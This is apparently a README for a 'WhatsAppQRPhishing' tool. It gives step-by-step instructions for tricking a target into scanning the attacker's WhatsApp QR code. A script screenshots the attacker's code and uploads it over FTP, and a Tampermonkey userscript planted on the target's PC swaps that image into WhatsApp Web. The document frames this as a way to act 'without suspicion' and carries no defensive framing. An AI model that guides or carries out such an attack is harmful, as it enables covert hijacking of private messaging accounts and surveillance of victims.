# WhatsAppQRPhishing
A method to have a target scan your own WhatsAppQRCode whithout suspicion

# Installation
Python needed!
User:
1. Pip install req.txt
2. Open whatsgrab.py in Editor and edit the paths on lines 15 and 16 so they are correct for your machine
3. Edit FTP access to your server
4. Open WhatsAppDesktop on your pc and run the script, if WhatsApp is not automatically focussed open it manually. The script will now keep screenshoting you QRCode and upload it to the server

Target:
1. Have the Target install https://www.tampermonkey.net/ extension
2. Create a new script for it and paste contents of extension.js into it
3. In Line 22 replace the Link with the Link to your updated QR Code on the server
4. Done, next time Target will open WhatsApp Web they will scan your Code

To stop it just close the whatsgrab.py script and uninstall the Extension on Targets Pc
